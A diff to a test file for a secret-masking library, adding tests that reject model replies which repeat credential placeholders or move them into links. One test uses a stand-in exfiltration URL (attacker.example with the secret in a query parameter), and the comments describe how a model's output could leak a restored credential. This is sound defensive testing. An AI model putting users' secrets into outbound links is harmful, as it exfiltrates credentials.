@@ -429,13 +429,67 @@ describe("restoreSecrets", () => {
     });
   });
 
-  it("replaces every occurrence when the model repeated a placeholder", () => {
+  /**
+   * This used to restore, on the reasoning that replacing every occurrence is
+   * simply what replacement means. It is the hole underneath that reasoning
+   * that changed it: the provider never sees the credential, but it does
+   * choose where its placeholder lands, and restoration is what turns that
+   * choice into the real value in the user's document. One occurrence in,
+   * two out, is the model materializing a secret in a place the user's own
+   * text never had one.
+   */
+  it("refuses a reply that repeated a placeholder rather than materializing the secret twice", () => {
     const masking = maskSecrets(`id ${AWS_DOC_ACCESS_KEY_ID} end`, { salt: FIXED_SALT });
     const reply = "[[FIXLANG_SECRET_A1B2C3_01]] then [[FIXLANG_SECRET_A1B2C3_01]]";
     expect(restoreSecrets(reply, masking)).toEqual({
-      ok: true,
-      text: `${AWS_DOC_ACCESS_KEY_ID} then ${AWS_DOC_ACCESS_KEY_ID}`,
+      ok: false,
+      reason: "placeholder-multiplicity",
+      missingCount: 1,
     });
+  });
+
+  it("keeps a placeholder the sent text itself repeated, at the same count", () => {
+    const masking = maskSecrets(
+      `first ${AWS_DOC_ACCESS_KEY_ID} then ${AWS_DOC_ACCESS_KEY_ID}`,
+      { salt: FIXED_SALT },
+    );
+    const reply = "[[FIXLANG_SECRET_A1B2C3_01]] and again [[FIXLANG_SECRET_A1B2C3_01]].";
+    expect(restoreSecrets(reply, masking)).toEqual({
+      ok: true,
+      text: `${AWS_DOC_ACCESS_KEY_ID} and again ${AWS_DOC_ACCESS_KEY_ID}.`,
+    });
+  });
+
+  /**
+   * The attack the count check alone does not stop: multiplicity is
+   * preserved, the reply reads as an ordinary rewrite, and the restored
+   * credential lands somewhere the receiving app will unfurl or fetch.
+   */
+  it("refuses a reply that moved a placeholder into a link", () => {
+    const masking = maskSecrets(`id ${AWS_DOC_ACCESS_KEY_ID} end`, { salt: FIXED_SALT });
+
+    expect(
+      restoreSecrets("See https://attacker.example/?k=[[FIXLANG_SECRET_A1B2C3_01]]", masking),
+    ).toEqual({ ok: false, reason: "placeholder-relocated", missingCount: 1 });
+
+    expect(
+      restoreSecrets("See [details](https://x.example/[[FIXLANG_SECRET_A1B2C3_01]])", masking),
+    ).toEqual({ ok: false, reason: "placeholder-relocated", missingCount: 1 });
+  });
+
+  /**
+   * The counterpart that keeps the check from being a blanket ban: a
+   * credential that legitimately lived in a URL is compared against where it
+   * WAS, not against the shape of the reply. Without this, `url-credentials`
+   * — the rule whose whole purpose is masking the password inside a DSN —
+   * could never round-trip at all.
+   */
+  it("allows a placeholder that was already inside a link in the sent text", () => {
+    const text = "DSN postgres://svc:hunter2horsebattery@db.example.com/app end";
+    const masking = maskSecrets(text, { salt: FIXED_SALT });
+    expect(masking.maskedText).toContain("://");
+
+    expect(restoreSecrets(masking.maskedText, masking)).toEqual({ ok: true, text });
   });
 
   it("is a no-op when nothing was masked", () => {
